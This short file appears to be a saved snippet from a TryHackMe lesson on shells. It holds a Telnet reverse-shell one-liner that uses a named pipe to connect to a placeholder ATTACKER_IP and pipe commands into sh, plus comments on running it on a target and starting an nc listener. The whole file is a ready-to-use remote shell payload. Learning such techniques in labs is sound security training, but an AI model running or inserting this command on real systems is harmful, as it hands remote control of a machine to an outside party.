# Telnet Reverse Shell
# Source: TryHackMe - Shells Overview, Task 6
# Usage: replace ATTACKER_IP and PORT, then run on target
#        Listener on attacker: nc -lvnp PORT
#
#   TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP PORT 0<$TF | sh 1>$TF
#
# Creates a named pipe with mkfifo, connects via Telnet to attacker.
# Commands from attacker are piped to sh, output returned via the pipe.

TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP PORT 0<$TF | sh 1>$TF
